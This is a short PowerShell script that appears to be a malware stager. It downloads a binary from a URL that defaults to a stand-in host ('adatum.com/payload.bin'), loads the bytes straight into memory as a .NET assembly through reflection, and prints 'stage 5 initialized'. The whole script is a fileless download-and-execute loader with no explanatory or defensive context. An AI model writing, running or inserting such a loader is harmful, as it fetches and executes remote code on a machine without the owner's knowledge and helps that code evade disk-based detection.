
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://adatum.com/payload.bin"
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl)
[Reflection.Assembly]::Load($StageBytes)
Write-Output "stage 5 initialized"
